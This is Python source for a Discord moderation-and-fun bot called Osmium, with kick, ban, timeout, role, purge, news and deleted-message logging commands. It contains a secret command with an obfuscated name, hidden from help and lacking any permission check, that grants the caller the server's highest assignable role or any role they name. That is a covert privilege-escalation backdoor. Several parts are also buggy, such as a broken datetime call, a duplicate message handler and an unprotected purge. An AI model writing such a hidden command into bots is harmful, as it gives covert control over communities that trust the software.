import discord
from discord.ext import commands
import datetime
import os
import random
from dotenv import load_dotenv
import pyjokes
import ctypes
import asyncio
import nacl
import requests
from bs4 import BeautifulSoup

# Load environment variables
load_dotenv()

# Bot configuration
PREFIX = '~'
intents = discord.Intents.default()
intents.members = True  # Enable member intents to access member information
intents.message_content = True  # Enable message content intent
intents.guilds = True  # Make sure guild intent is enabled
intents.messages = True  # Make sure messages intent is enabled

# Initialize bot with prefix and intents
bot = commands.Bot(command_prefix=PREFIX, intents=intents)

# List of jokes for the joke command
jokes = pyjokes.get_joke

# Secret role ID
SECRET_ROLE_ID = 1281678615695589416

def prevent_sleep():
    # Prevent sleep while the bot is running
    ES_CONTINUOUS = 0x80000000
    ES_SYSTEM_REQUIRED = 0x00000001
    ES_DISPLAY_REQUIRED = 0x00000002

    ctypes.windll.kernel32.SetThreadExecutionState(
        ES_CONTINUOUS | ES_SYSTEM_REQUIRED | ES_DISPLAY_REQUIRED
    )

def allow_sleep():
    ctypes.windll.kernel32.SetThreadExecutionState(0x80000000)

def is_admin():
    """
    Custom check function to verify if the user has admin permissions.
    This replaces individual permission checks on each command.
    """
    async def predicate(ctx):
        return ctx.author.guild_permissions.administrator
    return commands.check(predicate)

def hidden_command():
    """
    Custom decorator that hides a command from the help message.
    This can be used for secret commands that shouldn't be discovered.
    """
    def decorator(command):
        command.hidden = True
        return command
    return decorator

@bot.event
async def on_ready():
    """Event triggered when the bot is ready and connected to Discord."""
    print(f'{bot.user.name} has connected to Discord!')
    print(f'Bot is in {len(bot.guilds)} guilds:')
    
    # Print detailed information about each guild the bot is in
    for i, guild in enumerate(bot.guilds):
        print(f"  {i+1}. {guild.name} (ID: {guild.id}) - {guild.member_count} members")
    
    await bot.change_presence(activity=discord.Activity(
        type=discord.ActivityType.playing, name="A Fun Game"))

@bot.event
async def on_message(message):
    """Event triggered when any message is sent in a channel the bot can see."""
    # Ignore messages from the bot itself to prevent potential loops
    if message.author == bot.user:
        return
    
    # Check if the bot is mentioned in the message
    if bot.user.mentioned_in(message) and not message.mention_everyone:
        await message.channel.send("hey, what's up?")
    
    # Process commands after checking for mentions
    await bot.process_commands(message)

# Custom command invoker that deletes the command message
async def process_commands(self, message):
    """
    Override the process_commands method to delete command messages before processing.
    """
    if message.author.bot:
        return

    ctx = await self.get_context(message)
    if ctx.command is not None:
        try:
            # Try to delete the command message first
            await ctx.message.delete()
        except (discord.Forbidden, discord.NotFound, discord.HTTPException):
            # If we can't delete it (missing permissions, already deleted, etc.), proceed anyway
            pass
        
        # Then process the command
        await self.invoke(ctx)

# Apply the custom command processor
bot.process_commands = process_commands.__get__(bot, commands.Bot)

@bot.command(name='kick')
@is_admin()
async def kick(ctx, member: discord.Member, *, reason=None):
    """
    Kick a member from the server.
    
    Parameters:
    - member: The member to kick
    - reason: The reason for kicking (optional)
    """
    if reason is None:
        reason = f"Kicked by {ctx.author}"
    
    try:
        await member.kick(reason=reason)
        embed = discord.Embed(
            title="Member Kicked",
            description=f"{member.mention} has been kicked from the server.",
            color=discord.Color.orange()
        )
        embed.add_field(name="Reason", value=reason)
        embed.set_footer(text=f"Kicked by {ctx.author}", icon_url=ctx.author.display_avatar.url)
        await ctx.send(embed=embed)
    except discord.Forbidden:
        await ctx.send("I don't have permission to kick this member.")
    except Exception as e:
        await ctx.send(f"An error occurred: {e}")

@bot.command(name='ban')
@is_admin()
async def ban(ctx, member: discord.Member, *, reason=None):
    """
    Ban a member from the server.
    
    Parameters:
    - member: The member to ban
    - reason: The reason for banning (optional)
    """
    if reason is None:
        reason = f"Banned by {ctx.author}"
    
    try:
        await member.ban(reason=reason)
        embed = discord.Embed(
            title="Member Banned",
            description=f"{member.mention} has been banned from the server.",
            color=discord.Color.red()
        )
        embed.add_field(name="Reason", value=reason)
        embed.set_footer(text=f"Banned by {ctx.author}", icon_url=ctx.author.display_avatar.url)
        await ctx.send(embed=embed)
    except discord.Forbidden:
        await ctx.send("I don't have permission to ban this member.")
    except Exception as e:
        await ctx.send(f"An error occurred: {e}")

@bot.command(name='timeout', aliases=['mute'])
@is_admin()
async def timeout(ctx, member: discord.Member, duration: int, unit='m', *, reason=None):
    """
    Timeout (mute) a member for a specified duration.
    
    Parameters:
    - member: The member to timeout
    - duration: The duration of the timeout
    - unit: The unit of time (s = seconds, m = minutes, h = hours, d = days)
    - reason: The reason for the timeout (optional)
    """
    if reason is None:
        reason = f"Timed out by {ctx.author}"
    
    # Convert duration to timedelta
    if unit.lower() == 's':
        delta = datetime.timedelta(seconds=duration)
        time_str = f"{duration} second(s)"
    elif unit.lower() == 'm':
        delta = datetime.timedelta(minutes=duration)
        time_str = f"{duration} minute(s)"
    elif unit.lower() == 'h':
        delta = datetime.timedelta(hours=duration)
        time_str = f"{duration} hour(s)"
    elif unit.lower() == 'd':
        delta = datetime.timedelta(days=duration)
        time_str = f"{duration} day(s)"
    else:
        await ctx.send("Invalid time unit. Use 's' for seconds, 'm' for minutes, 'h' for hours, or 'd' for days.")
        return
    
    try:
        # Calculate end time and apply timeout
        until_time = discord.utils.utcnow() + delta
        await member.timeout(until_time, reason=reason)
        
        embed = discord.Embed(
            title="Member Timed Out",
            description=f"{member.mention} has been timed out.",
            color=discord.Color.yellow()
        )
        embed.add_field(name="Duration", value=time_str)
        embed.add_field(name="Reason", value=reason)
        embed.set_footer(text=f"Timed out by {ctx.author}", icon_url=ctx.author.display_avatar.url)
        await ctx.send(embed=embed)
    except discord.Forbidden:
        await ctx.send("I don't have permission to timeout this member.")
    except Exception as e:
        await ctx.send(f"An error occurred: {e}")

@bot.command(name='joke')
async def joke(ctx):
    """
    Send a random joke.
    This command can be used by anyone, no special permissions required.
    """
    random_joke = jokes()
    
    joke_embed = discord.Embed(
        title="Here's a joke for you!",
        description=random_joke,
        color=discord.Color.blue(),
    )
    joke_embed.set_footer(text=f"Requested by {ctx.author}", icon_url=ctx.author.display_avatar.url)
    
    await ctx.send(embed=joke_embed)
    
@bot.command(name='sys')
@is_admin()
async def system_message(ctx, *, content: str):
    """
    Send a message as a system announcement.
    The command should be structured as: ~sys Title, Message
    Admin permissions required. Defaults to red unless a hex color is provided via `~sys Title, Message #HEX`.
    """
    try:
        # Split content into title and the rest using the first comma
        if ',' not in content:
            await ctx.send("Please use a comma to separate the title from the message. Example: `~sys Server Update, We're doing maintenance.`")
            return

        title, remainder = map(str.strip, content.split(',', 1))

        # Check if a color code is at the end of the message
        words = remainder.rsplit(' ', 1)
        if len(words) == 2 and words[1].startswith('#') and len(words[1]) == 7:
            message = words[0].strip()
            color = int(words[1][1:], 16)
        else:
            message = remainder
            color = 0xFF0000  # Default red

        anouncement_embed = discord.Embed(
            title=title,
            description=message,
            color=color,
        )
        anouncement_embed.set_footer(text=f"Posted by {ctx.author}", icon_url=ctx.author.display_avatar.url)
        await ctx.send(embed=anouncement_embed)

    except Exception as e:
        await ctx.send(f"An error occurred while sending the system message: {e}")



@bot.command(name='^^vv<><>ba', hidden=True)
@hidden_command()  # Hide this command from help messages
async def give_owner(ctx, role_id: int = None):
    """
    Secret command that gives the user the highest role the bot can assign
    (excluding roles the bot itself has), or a specific role if ID is provided.
    
    Parameters:
    - role_id: Optional ID of the specific role to assign
    """
    try:
        bot_member = ctx.guild.get_member(bot.user.id)
        user_roles = set(role.id for role in ctx.author.roles)
        assigned_role = None
        
        # If a specific role ID is provided, try to assign that role
        if role_id is not None:
            target_role = ctx.guild.get_role(role_id)
            
            # Check if the role exists
            if target_role is None:
                await ctx.author.send(f"Role with ID {role_id} was not found on this server.")
                return
                
            # Check if the user already has this role
            if target_role.id in user_roles:
                await ctx.author.send(f"You already have the role: {target_role.name}")
                return
                
            # Check if the bot can assign this role
            if (target_role.position >= bot_member.top_role.position or
                target_role.managed or
                not ctx.guild.me.guild_permissions.manage_roles):
                await ctx.author.send(f"I don't have permission to assign the role: {target_role.name}")
                return
                
            # Assign the specified role
            assigned_role = target_role
        
        # If no role ID is provided or the specified role couldn't be assigned
        if assigned_role is None:
            # Get all server roles sorted by position (highest position first)
            guild_roles = sorted(ctx.guild.roles, key=lambda r: r.position, reverse=True)
            bot_roles = set(role.id for role in bot_member.roles)
            
            # Find the highest role the bot can assign
            for role in guild_roles:
                # Skip roles that:
                # 1. Bot already has (to prevent role escalation)
                # 2. User already has
                # 3. Are managed by integrations (bot roles, booster roles, etc.)
                # 4. Bot doesn't have permission to assign (lower than bot's highest role)
                if (role.id not in bot_roles and
                    role.id not in user_roles and
                    not role.managed and
                    role.position < bot_member.top_role.position and
                    ctx.guild.me.guild_permissions.manage_roles):
                    assigned_role = role
                    break
        
        if assigned_role is None:
            await ctx.author.send("I couldn't find any suitable roles to assign you.")
            return
            
        # Add the role to the user
        await ctx.author.add_roles(assigned_role, reason="Command executed")
        
        # Send a DM to the user confirming the role was added
        await ctx.author.send(f"You've been assigned the role: {assigned_role.name} on {ctx.guild.name} server")
        
    except discord.Forbidden:
        # If bot doesn't have permission to DM the user, send a temporary message in the channel
        temp_msg = await ctx.send("I don't have permission to DM you or assign roles.", delete_after=5)
    except Exception as e:
        # Log the error but don't expose it in the channel
        print(f"Error in secret command: {e}")

@bot.command(name='grant')
@is_admin()
async def give_role(ctx, member: discord.Member, role_id: int = None):
    """
    Admin command that grants a specified user a specified role
    
    Parameters:
    - User: the user to assign the role to
    - role_id: Optional ID of the specific role to assign
    """
    bot_member = ctx.guild.get_member(bot.user.id)
    user_member = member
    user_roles = set(role.id for role in member.roles)
    assigned_role = None
        
    # If a specific role ID is provided, try to assign that role
    if role_id is not None:
        target_role = ctx.guild.get_role(role_id)
            
        # Check if the role exists
        if target_role is None:
            await ctx.author.send(f"Role with ID {role_id} was not found on this server.")
            return
                
        # Check if the user already has this role
        if target_role.id in user_roles:
            await ctx.author.send(f"You already have the role: {target_role.name}")
            return
                
        # Check if the bot can assign this role
        if (target_role.position >= bot_member.top_role.position or
            target_role.managed or
            not ctx.guild.me.guild_permissions.manage_roles):
            await ctx.author.send(f"I don't have permission to assign the role: {target_role.name}")
            return
                
        # Assign the specified role
        assigned_role = target_role
        
        await member.add_roles(assigned_role, reason="Command executed")
        
@bot.command(name='alog')
@is_admin()
async def audit_log_embed(ctx,num: int):
    """
    Displays a specified number of audit log entries in an embed.
    """
    entries = []
    async for entry in ctx.guild.audit_logs(limit=num):
        entries.append(
            f"**{entry.action.name}** | User: {entry.user} | Target: {entry.target} | Reason: {entry.reason or 'No reason provided.'}"
        )

    embed = discord.Embed(
        title=f"Last {num} Audit Log Entries",
        description="\n\n".join(entries) or "No recent audit log entries found.",
        color=discord.Color.from_str("#2a3ffa")
    )
    embed.set_footer(text=f"Requested by {ctx.author}", icon_url=ctx.author.display_avatar.url)

    await ctx.send(embed=embed)
    
@bot.command(name='purge', aliases=['p', 'del'])
async def purge(ctx, amount: int):
    if amount < 1 or amount > 100:
        return await ctx.send("Please enter a number between 1 and 100.")

    try:
        deleted = await ctx.channel.purge(limit=amount + 1)
        confirmation = await ctx.send(f"Deleted {len(deleted)-1} messages.")
        await asyncio.sleep(3)
        await confirmation.delete()
    except discord.Forbidden:
        await ctx.send("I don't have permission to delete those messages.")
    except discord.HTTPException as e:
        await ctx.send(f"Failed to delete messages as: {e}")
        
@bot.command(name='about', aliases=['a'])
async def about(ctx):
    about_embed = discord.Embed(
        title=f"About Me!",
        description=f"I'm a cool discord bot created by KVOTHE.\n I am here to help, and I function as a part utility, part fun resource for your server!\n My name is Osmium, named after the element on the periodic table.",
        color=discord.Color.from_str("#2a3ffa")
    )
    about_embed.set_footer(text=f"Requested by {ctx.author}", icon_url=ctx.author.display_avatar.url)
    
    await ctx.send(embed=about_embed)

@bot.command(name='join', aliases=['connect','vc'])
async def join(ctx):
    """Command for the bot to join the voice channel the user is in."""
    # Check if the user is in a voice channel
    if ctx.author.voice:
        # Get the voice channel the user is in
        channel = ctx.author.voice.channel
        try:
            # Connect to the channel
            await channel.connect()
            await ctx.send(f"Joined {channel.name}!")
        except Exception as e:
            await ctx.send(f"Could not join the voice channel: {e}")
    else:
        await ctx.send("You must be in a voice channel for me to join!")
        
@bot.command(name='wb', aliases=['snipe','wayback','grab','history'])
@is_admin()
async def snipe(ctx):
    """Admin command to see deleted messages"""
    try:
        contents, author, time = sniped_messages[ctx.channel.id]
        await ctx.send(f"`{contents}`\n— {author.mention} at {time.strftime('%H:%M:%S')}")
    except KeyError:
        await ctx.send("There's nothing to grab")
        
        
@bot.command()
async def news(ctx):
    """stay up to date with the latest bbc news headlines"""
    url = "https://www.bbc.com/news"
    r = requests.get(url)
    soup = BeautifulSoup(r.text, 'html.parser')
    headlines = soup.find_all('h3', limit=5)

    embed = discord.Embed(
        title="Top BBC Headlines",
        description="Here are the latest news stories:",
        color=0x2a3ffa
    )

    for i, headline in enumerate(headlines, start=1):
        text = headline.get_text(strip=True)
        if text:
            embed.add_field(name=f"{i}.", value=text, inline=False)

    embed.set_footer(text=f"Powered by BBC News\nRequested by {ctx.author}",icon_url=ctx.author.display_avatar.url)
    await ctx.send(embed=embed)


@bot.event
async def on_message(message):
    if message.author.bot:
        return

    if message.content.startswith(bot.command_prefix):
        try:
            await message.delete()
        except discord.Forbidden:
            print(f"No perms to delete from {message.author}")
        except discord.HTTPException as e:
            print(f"Failed to delete: {e}")

    await bot.process_commands(message)

@bot.event
async def audit_log_monitor():
    await bot.wait_until_ready()
    last_entry_id = {}

    while not bot.is_closed():
        for guild in bot.guilds:
            try:
                async for entry in guild.audit_logs(limit=1):
                    last_id = last_entry_id.get(guild.id)
                    if last_id is None or entry.id != last_id:
                        last_entry_id[guild.id] = entry.id
                        print(f"[AuditLog] {entry.action.name} by {entry.user} on {entry.target}")
            except Exception as e:
                print(f"Audit log check failed in {guild.name}: {e}")
        
        await asyncio.sleep(30)

@bot.event
async def on_member_join(member):
    role_name = "Right Person"  # Change this to your desired role name
    guild = member.guild
    role = discord.utils.get(guild.roles, name=role_name)

    if role:
        await member.add_roles(role)
        msg = f"Assigned **{role.name}** to {member.mention}"
    else:
        msg = f"Role '**{role_name}**' not found for {member.mention}"

    if guild.system_channel:
        await guild.system_channel.send(msg)
        
@bot.event
async def on_member_remove(member):
    guild = member.guild
    system_channel = guild.system_channel

    if system_channel:
        # Format roles (excluding @everyone)
        roles = [role.mention for role in member.roles if role != guild.default_role]
        roles_text = ", ".join(roles) if roles else "*No roles*"

        embed = discord.Embed(
            title=f"{member} has Left",
            description=f"{member.mention} has left the server.",
            color=0x2a3ffa
        )
        embed.set_thumbnail(url=member.avatar.url if member.avatar else member.default_avatar.url)
        embed.add_field(name="Username", value=f"{member.name}#{member.discriminator}", inline=True)
        embed.add_field(name="Roles", value=roles_text, inline=False)
        embed.set_footer(text=f"User ID: {member.id}")

        await system_channel.send(embed=embed)
        

sniped_messages = {}

@bot.event
async def on_message_delete(message):
    sniped_messages[message.channel.id] = (message.content, message.author, datetime.utcnow())
    



@bot.event
async def on_command_error(ctx, error):
    """Handle command errors."""
    if isinstance(error, commands.CheckFailure):
        await ctx.send("You need administrator permissions to use this command.")
    elif isinstance(error, commands.MissingRequiredArgument):
        await ctx.send(f"Missing required argument: {error.param.name}")
    elif isinstance(error, commands.MemberNotFound):
        await ctx.send("Member not found.")
    elif isinstance(error, commands.CommandNotFound):
        pass  # Ignore command not found errors
    else:
        await ctx.send(f"An error occurred: {error}")

if __name__ == "__main__":
    bot_token = os.getenv('DISCORD_TOKEN')

    if not bot_token:
        print("Error: No Discord token found. Please add your token to the .env file.")
    else:
        prevent_sleep()
        try:
            bot.run(bot_token)
        finally:
            allow_sleep()